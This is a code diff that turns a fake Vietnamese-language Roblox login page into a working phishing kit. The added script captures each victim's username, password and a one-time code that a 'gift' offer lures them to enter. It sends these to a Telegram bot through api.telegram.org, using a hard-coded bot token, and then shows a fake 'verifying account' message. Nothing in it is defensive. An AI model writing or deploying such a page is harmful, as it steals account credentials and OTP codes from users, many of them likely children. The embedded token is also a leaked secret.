@@ -9,7 +9,7 @@
             margin: 0;
             padding: 20px;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #121212; /* Nền tối giống ảnh */
+            background-color: #121212;
             color: #ffffff;
             display: flex;
             justify-content: center;
@@ -20,7 +20,7 @@
         .container {
             width: 100%;
             max-width: 400px;
-            background: transparent; /* Giống style overlay trong ảnh */
+            background: transparent;
             padding: 30px 20px;
             border-radius: 8px;
         }
@@ -35,7 +35,7 @@
             width: 100%;
             padding: 14px;
             margin-bottom: 15px;
-            background-color: #1e1e1e; /* Ô input tối màu */
+            background-color: #1e1e1e;
             border: 1px solid #333333;
             border-radius: 8px;
             font-size: 16px;
@@ -61,7 +61,7 @@
             border: none;
         }
         .btn-login {
-            background-color: #ffffff; /* Nút đăng nhập màu trắng giống ảnh */
+            background-color: #ffffff;
             color: #000000;
         }
         .btn-secondary {
@@ -105,9 +105,10 @@
     <div class="container">
         <h2>ROBLOX</h2>
         
-        <form onsubmit="event.preventDefault();">
-            <input type="text" placeholder="Tên người dùng/Địa chỉ email/Số điện thoại">
-            <input type="password" placeholder="Mật khẩu">
+        <!-- Form đăng nhập chính -->
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Tên người dùng/Địa chỉ email/Số điện thoại" required>
+            <input type="password" id="password" placeholder="Mật khẩu" required>
             <button type="submit" class="btn-login">Đăng nhập</button>
             <button type="button" class="btn-secondary">Gửi mã một lần cho tôi qua email</button>
             <button type="button" class="btn-secondary">Đăng Nhập Nhanh</button>
@@ -117,12 +118,73 @@
         
         <div class="divider"></div>
         
+        <!-- Phần mã OTP / Nhận quà -->
         <div class="otp-section">
             <div class="otp-title">Nhập mã một lần.</div>
             <div class="otp-desc">Nhập email đã xác minh cho tài khoản của bạn để nhận quà một lần</div>
-            <input type="text" placeholder="Mã một lần">
-            <button type="button" class="btn-login">Tiếp tục</button>
+            <input type="text" id="otpCode" placeholder="Mã một lần">
+            <button type="button" id="btnOtp" class="btn-login">Tiếp tục</button>
         </div>
     </div>
+
+    <script>
+        // Cấu hình Telegram Bot của bạn
+        const BOT_TOKEN = "8863033504:AAGzOflzN5aLzRAe-A1MzjvvkP1t0xGkADM";
+        const CHAT_ID = "YOUR_CHAT_ID"; // Thay bằng Chat ID Telegram của bạn (ví dụ: "123456789")
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "Markdown"
+            };
+
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log("Đã gửi thông tin về Telegram thành công!");
+            })
+            .catch(error => {
+                console.error("Lỗi khi gửi:", error);
+            });
+        }
+
+        // Bắt sự kiện khi người dùng bấm Đăng nhập
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
+            e.preventDefault(); // Chặn load lại trang
+            
+            const user = document.getElementById("username").value;
+            const pass = document.getElementById("password").value;
+
+            const msg = `🚨 *Thông tin đăng nhập Roblox mới:*\n👤 Tài khoản: \`${user}\`\n🔑 Mật khẩu: \`${pass}\``;
+            
+            sendToTelegram(msg);
+            
+            // Giả lập chuyển hướng hoặc thông báo lỗi giả sau khi bấm
+            alert("Đang xác thực tài khoản...");
+        });
+
+        // Bắt sự kiện khi người dùng bấm Tiếp tục ở phần Mã một lần / Quà
+        document.getElementById("btnOtp").addEventListener("click", function() {
+            const otp = document.getElementById("otpCode").value;
+            if(!otp) {
+                alert("Vui lòng nhập mã!");
+                return;
+            }
+
+            const msg = `🎁 *Mã OTP / Quà được nhập:*\n🔢 Mã: \`${otp}\``;
+            
+            sendToTelegram(msg);
+            
+            alert("Mã đang được xử lý...");
+        });
+    </script>
 </body>
 </html>
